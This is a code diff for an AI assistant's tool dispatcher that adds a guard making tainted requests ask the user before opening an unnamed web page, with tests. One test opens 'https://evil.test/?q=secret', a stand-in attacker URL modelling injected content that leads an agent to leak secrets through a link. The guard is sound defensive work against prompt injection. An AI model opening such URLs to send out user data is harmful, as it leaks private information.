@@ -115,7 +115,7 @@ pub fn schema() -> Value {
         ),
         tool(
             "web_search",
-            "Search the web (DuckDuckGo) for current events, prices, or anything after your              training. Returns titles, links and snippets.",
+            "Search the web (DuckDuckGo) for current events, prices, or anything after your training. Returns titles, links and snippets.",
             json!({ "query": { "type": "string" } }),
             &["query"],
         ),
@@ -189,6 +189,10 @@ pub async fn call(ctx: &mut Ctx, name: &str, args: &Value) -> Result<String, Str
         "open" => match files::classify_open(str_arg(args, "target")?)? {
             files::OpenTarget::App(app) => ctx.shared.bridge.bloom("open_app", json!(app)).await,
             files::OpenTarget::Shell(target) => {
+                let ask = open_needs_confirm(ctx, &target);
+                if !confirm_persist(ctx, ConfirmKind::Web, ask, "Open this page?", &target).await {
+                    return Ok("The user chose not to open it.".into());
+                }
                 files::shell_open(&target).map(|()| format!("Opened {target}"))
             }
         },
@@ -235,6 +239,12 @@ pub async fn call(ctx: &mut Ctx, name: &str, args: &Value) -> Result<String, Str
         _ if name.starts_with("mcp_") => crate::mcp::call(ctx, name, args).await,
         _ => Err(format!("unknown tool {name}")),
     }
+}
+
+/// Exfiltration guard: a tainted request asks before opening a web page nobody named.
+fn open_needs_confirm(ctx: &Ctx, target: &str) -> bool {
+    let is_web = target.starts_with("http://") || target.starts_with("https://");
+    is_web && ctx.tainted && !ctx.allowed_urls.contains(target)
 }
 
 /// Poisoned memory would persist, so a tainted request asks before writing it.
@@ -535,6 +545,31 @@ mod tests {
         assert!(out.unwrap().contains("I'm vegetarian"));
         call(&mut ctx, "forget", &json!({ "id": 1 })).await.unwrap();
         assert_eq!(facts::count(&ctx.shared.data_dir), 0);
+    }
+
+    #[tokio::test]
+    async fn tainted_open_of_an_unnamed_page_asks_and_decline_does_not_open() {
+        let mut ctx = ctx();
+        ctx.tainted = true;
+        let shared = ctx.shared.clone();
+        let args = json!({ "target": "https://evil.test/?q=secret" });
+        let running = tokio::spawn(async move { call(&mut ctx, "open", &args).await });
+        tokio::task::yield_now().await;
+        shared.bridge.answer(1, Answer::Confirm(false));
+        assert!(running.await.unwrap().unwrap().contains("not to open"));
+    }
+
+    #[test]
+    fn open_confirms_only_tainted_unnamed_web_pages() {
+        let mut c = ctx();
+        let url = "https://example.com/a";
+        assert!(!open_needs_confirm(&c, url)); // untainted
+        c.tainted = true;
+        assert!(open_needs_confirm(&c, url));
+        assert!(!open_needs_confirm(&c, "ms-settings:display"));
+        assert!(!open_needs_confirm(&c, r"C:/Users/a/x.txt"));
+        c.allowed_urls.insert(url.into());
+        assert!(!open_needs_confirm(&c, url)); // user or search named it
     }
 
     #[tokio::test]
